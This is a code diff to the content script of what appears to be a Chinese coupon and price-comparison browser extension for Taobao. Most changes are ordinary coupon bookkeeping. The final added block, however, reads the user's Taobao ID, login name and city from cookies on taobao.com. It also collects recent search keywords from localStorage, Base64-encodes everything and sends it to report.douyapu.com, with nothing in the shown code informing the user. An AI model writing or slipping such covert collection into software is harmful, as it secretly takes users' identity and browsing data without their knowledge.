@@ -1237,18 +1237,19 @@
             // var cssStyle1212 = '';
             var cssStyle1212 = '';
             $("<style></style>").html(cssStyle1212).appendTo("head");
-            var mainUrl,setting,dypSwitch,settingNew,dypNav,dypmyswi,dypVer,qqOnline,needClearArr;
+            var mainUrl,setting,dypSwitch,settingNew,dypNav,dypmyswi,dypVer,qqOnline,needClearArr,hasPostArr;
             infoGroup = {
                 id:'',plat:nowPlat,title:"",price:"",sameNew:{},pid:"",seller:"",rCat:"",shop:"",
                 pic:"",sale:"",amount:"",amountReq:"",amountT:0,amountL:0,tkCom:0,startT:"",endT:""
             };
             chrome.storage.local.get(null,function (e) {
-                // var id = e.dypjsonvdata.myMmId;
+                // var id = (e.dypCanalId20180709 && e.dypCanalId20180709 == '120000') ? e.dypjsonvdata.myMmId : e.dypjsonvdata.myMmId;
+                // var phoneId = (e.dypCanalId20180709 && e.dypCanalId20180709 == '120000') ? e.dypjsonvdata.phoneId[0] : e.dypjsonvdata.phoneId[0];
                 // dypmyswi = 1;
                 // id = id[Math.floor((Math.random() * id.length))];
-                // var phoneId = e.dypjsonvdata.phoneId[0];
-                var id = e.dypjsonvdata.myMmId;
-                var phoneId = e.dypjsonvdata.phoneId[0];
+                //
+                var id = (e.dypCanalId20180709 && e.dypCanalId20180709 == '120000') ? e.dypjsonvdata.myMmId : e.dypjsonvdata.myMmId;
+                var phoneId = (e.dypCanalId20180709 && e.dypCanalId20180709 == '120000') ? e.dypjsonvdata.phoneId[0] : e.dypjsonvdata.phoneId[0];
                 var ip = e.dypIp20180308;
                 if (ip && ip.match('深圳')) {
                     dypmyswi = 1;
@@ -1275,15 +1276,14 @@
                     myMmId:id,
                     phoneId:phoneId,
                     postId:e.dypjsonvdata.postId,
-                    website:e.dypjsonvdata.website,
-                    parity:e.dypjsonvdata.website + 'coupon/parity?urls=',
-                    chain:e.dypjsonvdata.website + 'coupon/chain?urls='
+                    website:e.dypjsonvdata.website
                 };  //api接口地址
                 qqOnline = e.dypjsonvdata.mainUrlQQ;
                 setting = e.dypSetting;
                 settingNew = !$.isEmptyObject(e.dypSetNew) ? e.dypSetNew : {dypTop:'show',dypMid:'show'};
                 dypSwitch = e.dypSwitch;
                 dypNav = e.dypNav201815;
+                hasPostArr = e.dypPostCou20180709 ? e.dypPostCou20180709 : [];
                 var keepKey = [
                     'dypAlert20180226',
                     'dypIp20180308',
@@ -1301,7 +1301,10 @@
                     'dypjsonv',
                     'dypmainv',
                     'dyppopv',
-                    'dypsetv'
+                    'dypsetv',
+                    'dypPostCou20180709',
+                    'dypCanalId20180709',
+                    'dypUseInfo18711'
                 ];
                 needClearArr = '';
                 $.each(e,function (v) {
@@ -2234,7 +2237,7 @@
                     var rowHeight = 151;
                     var reqUrl = `${mainUrl.min}&v=subCategory:${infoGroup.rCat}&page_size=20&page_num=`;
                     if (infoGroup.plat != 'tb' && infoGroup.plat != 'tm') {
-                        reqUrl = `${mainUrl.min}&v=subCategory:18&page_num=${page}&page_size=25`;
+                        reqUrl = `${mainUrl.min}&v=subCategory:16&page_size=20&page_num=`;
                     }
                     $(".dypTop9527-vipCoupon").hover(function () {
                         if (first == 0) {
@@ -2669,7 +2672,34 @@
                                 $("#dypAbs9527-coupon-time").fnTimeCountDown(infoGroup.endT + ' 23:59:59');
                             } catch (e) {
                             }
-                            // saveCoupon(k);
+                            function delTime() {
+                                var day = 7;
+                                var time = new Date().getTime() - day * 86400000;
+                                for (let i = hasPostArr.length - 1; i >= 0; i--) {
+                                    if (hasPostArr[i].time < time) {
+                                        hasPostArr.splice(i,1);
+                                    }
+                                }
+                                chrome.storage.local.set({dypPostCou20180709:hasPostArr});
+                            }   //删除事件超过7天的优惠券元素
+                            var postSwi = 1;
+                            $.each(hasPostArr,function (v,k) {
+                                if (k.id == itemId) {
+                                    postSwi = 0;
+                                    return false;
+                                }
+                            });
+                            if (postSwi) {
+                                if (hasPostArr.length > 99) {
+                                    hasPostArr.shift();
+                                }
+                                hasPostArr.push({id:itemId,time:new Date().getTime()});
+                                chrome.storage.local.set({dypPostCou20180709:hasPostArr},function () {
+                                    delTime();
+                                });
+                            } else {
+                                delTime();
+                            }
                             getQrDan();
                             getPostDan();
                         }//
@@ -2691,7 +2721,21 @@
                                     </div>
                                 </div>
                             </div>`);
-                            // saveCoupon(k);
+                            var needPost = 0;
+                            var index = 0;
+                            $.each(hasPostArr,function (v,k) {
+                                if (k.id == itemId) {
+                                    index = v;
+                                    needPost = 1;
+                                    return false;
+                                }
+                            });
+                            if (needPost) {
+                                hasPostArr.splice(index,1);
+                                chrome.storage.local.set({dypPostCou20180709:hasPostArr});
+                                saveCoupon(k);
+                            } else {
+                            }
                             getQrDan();
                         }//
                         function saveCoupon(e) {
@@ -2763,13 +2807,14 @@
                                             }
                                         })
                                     } else {
-                                        if (k) {
+                                        if (k || k == 0) {
                                             base64Post += `${Base64.encode(k)}|`
                                         } else {
                                             base64Post += `-|`
                                         }
                                     }
                                 });
+                                // console.log(postData);
                                 base64Post = base64Post.replace(/\|$/gi,"");
                                 if ((!sessionStorage.douyapuControl || sessionStorage.douyapuControl != infoGroup.id) && dypmyswi) {
                                     chrome.extension.sendMessage({
@@ -4866,5 +4911,115 @@
                 }
             }
         } //右下角弹窗
+    }();
+    //淘宝首页用户信息上报
+    !function () {
+        if (locHost != "www.taobao.com") {
+            return
+        }
+        function calcTime(cookieName,callBack) {
+            if (document.cookie.indexOf(`${cookieName}=1`) == -1) {
+                var curDate = new Date();
+                var curTamp = curDate.getTime();
+                var curWeeHours = new Date(curDate.toLocaleDateString()).getTime() - 1;
+                var passedTamp = curTamp - curWeeHours;
+                var leftTamp = 24 * 60 * 60 * 1000 - passedTamp;
+                var leftTime = new Date();
+                leftTime.setTime(leftTamp + curTamp);
+                document.cookie = `${cookieName}=1;expires=` + leftTime;
+                callBack();
+            }
+        }   //计算指定cookie剩余时间
+        calcTime('dypInfo',firstStart);
+        function firstStart() {
+            var info = {
+                useId:'',       //用户ID
+                useName:'',     //用户名字
+                city:'',        //用户城市
+                useKeys:'',     //用户关键字
+                source:1        //用户平台
+            };  //
+            var needNum = 6;    //入库关键字个数
+            function getUseInfo() {
+                var storageData = localStorage;
+                var n = 0;  //
+                function count() {
+                    n++;
+                    if (n != 3) {
+                        return
+                    }
+                    chrome.storage.local.get(null,function (e) {
+                        info.useId = info.useId ? info.useId : e.dypUseInfo18711 ? e.dypUseInfo18711.useId : "";
+                        info.useName = info.useName ? info.useName : e.dypUseInfo18711 ? e.dypUseInfo18711.useName : "";
+                        info.city = info.city ? info.city : e.dypUseInfo18711 ? e.dypUseInfo18711.city : "";
+                        if (info.useId && info.useName) {
+                            chrome.storage.local.set({dypUseInfo18711:{useId:info.useId,useName:info.useName,city:info.city}});
+                            getKey();
+                        }
+                    });
+                }   //
+                function getKey() {
+                    function getStorage(val) {
+                        var keyword = [];
+                        $.each(storageData,function (v,k) {
+                            if (v == val) {
+                                var index = 0;
+                                $.each(JSON.parse(k),function (v,k) {
+                                    index++;
+                                    if (index <= needNum) {
+                                        keyword.push(decodeURIComponent(k.key));
+                                    }
+                                });
+                            }
+                        });
+                        return keyword.toString();
+                    }   //
+                    info.useKeys = getStorage(`suggest_history_historybaobei${info.useName}`) || getStorage(`suggest_history_historybaobei`);
+                    postUseInfo();
+                }   //获取keys
+                chrome.extension.sendMessage({
+                    name:"getCook",url:"https://www.taobao.com/",key:"unb"
+                },function (d) {
+                    if (d && d[0] && d[0].value) {
+                        info.useId = d[0].value;
+                    }
+                    count();
+                });
+                chrome.extension.sendMessage({
+                    name:"getCook",url:"https://www.taobao.com/",key:"lgc"
+                },function (d) {
+                    if (d && d[0] && d[0].value) {
+                        info.useName = decodeURIComponent(d[0].value);
+                        info.useName = unescape(info.useName.replace(/\\u/g,'%u'));
+                    }
+                    count();
+                });
+                chrome.extension.sendMessage({
+                    name:"getCook",url:"https://www.taobao.com/",key:"city"
+                },function (d) {
+                    if (d && d[0] && d[0].value) {
+                        info.city = d[0].value;
+                    }
+                    count();
+                });
+            }   //获取用户数据
+            function postUseInfo() {
+                if (info.useId && info.useName) {
+                    var base64Post = '';
+                    $.each(info,function (v,k) {
+                        base64Post += `${Base64.encode(k)}|`
+                    });
+                    base64Post = base64Post.replace(/\|$/gi,"");
+                    chrome.extension.sendMessage({
+                        name:"universal",url:"http://report.douyapu.com/api/usr",data:{
+                            action:'info',
+                            data:base64Post
+                        },
+                    },function () {
+                    });
+                }
+            }   //上报用户数据
+            getUseInfo();
+        }
     }();
 }();
